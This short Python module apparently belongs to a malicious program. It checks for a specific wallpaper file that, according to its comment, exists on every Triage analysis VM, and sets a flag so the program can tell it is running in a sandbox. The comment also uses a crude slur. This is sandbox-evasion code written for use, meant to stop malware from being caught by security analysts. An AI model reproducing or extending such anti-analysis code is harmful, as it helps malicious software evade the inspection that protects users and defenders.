import os
from co.config import ANTI_VM  
VM = False
def check_vm_files():
    global VM
    if ANTI_VM:
        if os.path.exists(r"C:\Users\admin\Pictures\My Wallpaper.jpg") or os.path.exists(r"C:\Users\Admin\Pictures\My Wallpaper.jpg"):
            VM = True
    else:
        VM = False
check_vm_files()
#triage is pretty retaded cuz all traige vms have this one exact file